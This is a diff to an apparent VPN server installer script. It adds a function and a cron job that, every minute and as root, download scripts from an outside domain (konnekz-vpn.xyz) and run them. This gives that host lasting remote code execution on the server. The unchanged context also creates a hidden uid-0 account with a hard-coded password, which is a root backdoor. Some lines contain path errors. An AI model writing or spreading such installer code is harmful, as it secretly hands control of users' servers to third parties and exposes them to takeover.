@@ -635,13 +635,33 @@ systemctl start openvpn@server
 
 }
 
-database_cron () {
+Database_Api () {
+#API Details
+VPN_Owner='MTknetwork';
+API_LINK='konnekz-vpn.xyz/api/premium';
+API_KEY='TKnetwork';
+
+
+cat <<EOF >/home/authentication.sh
 #!/bin/bash
-/bin/cat <<"EOM" >/root/cron.sh
-php /usr/local/sbin/ssh.php
-chmod +x /root/active.sh
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /root/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /root/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /root/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
 bash /root/active.sh
-EOM
+sleep 15
+bash /rootinactive.sh
+sleep 15
+bash /root/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+sh active.sh | tee -a  /root/active.sh
 }
 
 serviceenable () {
@@ -931,12 +951,12 @@ swapoff -a && swapon -a
 echo "Ram Cleaned!"
 EOM
 
-cat << EOF > /var/spool/cron/root	
-*/15 * * * * /bin/bash /root/cron.sh >/dev/null 2>&1
+cat << EOF > /var/spool/cron/root
+* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1
+*/15 * * * * /bin/bash  /home/active.sh >/dev/null 2>&1
 */5 * * * * /bin/bash /root/auto >/dev/null 2>&1
 EOF
 
-bash /root/cron.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
@@ -1081,7 +1101,6 @@ Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5(
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
-wget -O /usr/local/sbin/ssh.php mhixvpnlite.000webhostapp.com/uni/debian/vip.sh -q
 }
 
 privatecategory () {
@@ -1115,7 +1134,7 @@ do
 		iptablesrules
 		pythonproxyinstall	
 		premiumcategory	
-                database_cron
+                Database_Api
 		serviceenable
 		
 		sleep 3
